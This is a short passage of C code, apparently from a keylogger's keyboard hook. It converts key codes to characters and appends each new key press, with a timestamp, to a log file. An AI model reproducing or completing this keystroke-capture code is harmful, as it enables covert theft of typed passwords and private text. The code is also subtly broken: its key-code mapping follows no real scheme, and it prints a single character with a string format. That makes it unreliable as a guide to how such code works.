            // Assume 'A' to 'Z' for shift-modified letters and symbols
            if (key >= 0x0080 && key <= 0x00FF) {
                key_char = (key - 0x0080) + 'A';
            } else if (key >= 0x0100 && key <= 0x0103) {
                key_char = (key - 0x0100) + ' ';
            }

            // Record the key press
            if (key != last_key || shift != last_shift || caps != last_caps || alt != last_alt) {
                // Append to log file
                fprintf(g_log_file, "[%s] %s\n", GetCurrentTime(), key_char);
                last_key = key;
                last_shift = shift;
                last_caps = caps;
                last_alt = alt;
            }
        } else if (wParam == 0x0000) {
